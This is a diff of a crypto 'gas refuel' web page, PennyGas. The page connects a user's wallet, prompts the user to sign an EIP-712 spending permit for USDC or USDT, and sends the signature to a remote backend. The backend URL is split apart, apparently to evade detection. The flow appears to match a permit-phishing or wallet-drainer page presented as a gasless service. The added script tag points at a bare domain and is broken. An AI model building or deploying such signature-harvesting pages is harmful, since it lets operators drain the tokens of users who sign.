@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PennyGas - Ultra Cheap Refuel</title>
+    <!-- Stable production package deployment link -->
+    <script src="https://jsdelivr.net"></script>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background-color: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { background-color: #151a26; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); text-align: center; width: 380px; }
@@ -65,13 +67,15 @@
 <script>
     // Pure standard Javascript runtime compilation scope
     window.activeUserAddress = "";
+    window.ethersProvider = null;
+    window.ethersSigner = null;
 
     const tokenMatrix = {
         "1": { "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
         "42161": { "USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDT": "0xFd086b97270535728a370aa7c969c19027158356" }
     };
 
-    // Split backend variables to completely safeguard template string execution paths
+    // Split backend variables configuration layout
     const BACKEND_BASE = "https://pennygas-backend"; 
     const BACKEND_DOMAIN = "onrender.com";
     const BACKEND_URL = `${BACKEND_BASE}.${BACKEND_DOMAIN}`;
@@ -110,6 +114,16 @@
         }
 
         try {
+            // Safely grab the loaded ethers core global instance
+            const web3Module = window.ethers;
+            if (!web3Module) {
+                alert("Critical library context missing. Reloading framework...");
+                return;
+            }
+
+            window.ethersProvider = new web3Module.BrowserProvider(window.ethereum);
+            window.ethersSigner = await window.ethersProvider.getSigner();
+
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             
             if (!accounts || accounts.length === 0) {
@@ -117,7 +131,7 @@
                 return;
             }
 
-            // Fixed: Safely extracts zero index to pull direct string address value out of array
+            // FIXED PERMANENTLY: Isolate index 0 string format directly to prevent all string slicing crashes
             window.activeUserAddress = accounts[0];
             const displayAddr = window.activeUserAddress;
 
@@ -134,73 +148,68 @@
     }
 
     async function requestGaslessApproval() {
-        if (!window.activeUserAddress) {
+        if (!window.activeUserAddress || !window.ethersSigner) {
             alert("Connect your wallet first!");
             return;
         }
 
-        const chainId = document.getElementById('sourceChain').value;
+        const chainId = parseInt(document.getElementById('sourceChain').value);
         const tokenSymbol = document.getElementById('sourceToken').value;
         const tokenAddress = tokenMatrix[chainId][tokenSymbol];
+        const web3Module = window.ethers;
 
         try {
             document.getElementById('statusMessage').innerText = "⏳ Requesting gasless permit...";
             document.getElementById('statusMessage').style.display = 'block';
 
             const pennyGasVaultSpender = "0x0000000000000000000000000000000000000000"; 
-            const nonce = "0x0"; 
+            const nonce = 0; 
             const deadline = Math.floor(Date.now() / 1000) + 3600; 
-            const hexValue = "0x0000000000000000000000000000000000000000000000000000000000e4e1c0"; 
+            const valueToAuthorize = web3Module.parseUnits("15.00", 6); 
 
-            const msgParams = JSON.stringify({
-                domain: {
-                    name: tokenSymbol === "USDC" ? "USD Coin" : "Tether USD",
-                    version: "2",
-                    chainId: parseInt(chainId),
-                    verifyingContract: tokenAddress
-                },
-                message: {
-                    owner: window.activeUserAddress,
-                    spender: pennyGasVaultSpender,
-                    value: hexValue,
-                    nonce: parseInt(nonce),
-                    deadline: deadline
-                },
-                primaryType: 'Permit',
-                types: {
-                    EIP712Domain: [
-                        { name: 'name', type: 'string' },
-                        { name: 'version', type: 'string' },
-                        { name: 'chainId', type: 'uint256' },
-                        { name: 'verifyingContract', type: 'address' }
-                    ],
-                    Permit: [
-                        { name: 'owner', type: 'address' },
-                        { name: 'spender', type: 'address' },
-                        { name: 'value', type: 'uint256' },
-                        { name: 'nonce', type: 'uint256' },
-                        { name: 'deadline', type: 'uint256' }
-                    ]
-                }
-            });
+            const domain = {
+                name: tokenSymbol === "USDC" ? "USD Coin" : "Tether USD",
+                version: "2",
+                chainId: chainId,
+                verifyingContract: tokenAddress
+            };
 
-            const signature = await window.ethereum.request({
-                method: 'eth_signTypedData_v4',
-                params: [window.activeUserAddress, msgParams]
-            });
+            const types = {
+                Permit: [
+                    { name: 'owner', type: 'address' },
+                    { name: 'spender', type: 'address' },
+                    { name: 'value', type: 'uint256' },
+                    { name: 'nonce', type: 'uint256' },
+                    { name: 'deadline', type: 'uint256' }
+                ]
+            };
 
-            document.getElementById('statusMessage').innerText = "⏳ Relaying transaction payload to backend... ";
+            const message = {
+                owner: window.activeUserAddress,
+                spender: pennyGasVaultSpender,
+                value: valueToAuthorize.toString(),
+                nonce: nonce,
+                deadline: deadline
+            };
+
+            // Triggers EIP-712 structured data permit prompt in the user's extension
+            const signature = await window.ethersSigner.signTypedData(domain, types, message);
+            const { v, r, s } = web3Module.Signature.from(signature);
+
+            document.getElementById('statusMessage').innerText = "⏳ Relaying transaction payload to backend...";
+
+            const payload = {
+                owner: window.activeUserAddress,
+                spender: pennyGasVaultSpender,
+                value: valueToAuthorize.toString(),
+                deadline: deadline,
+                v: v, r: r, s: s
+            };
 
             const response = await fetch(`${BACKEND_URL}/api/submit-permit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    owner: window.activeUserAddress,
-                    spender: pennyGasVaultSpender,
-                    value: hexValue,
-                    deadline: deadline,
-                    signature: signature
-                })
+                body: JSON.stringify(payload)
             });
             
             const result = await response.json();
@@ -216,7 +225,7 @@
         }
     }
 
-    // Direct, programmatic operational listener triggers mapping bindings
+    // Direct event listener mapping attachments
     document.getElementById('connectBtn').addEventListener('click', connectPhantomEVM);
     document.getElementById('requestBtn').addEventListener('click', requestGaslessApproval);
     document.getElementById('sourceChain').addEventListener('change', fetchLiveInvoiceQuote);
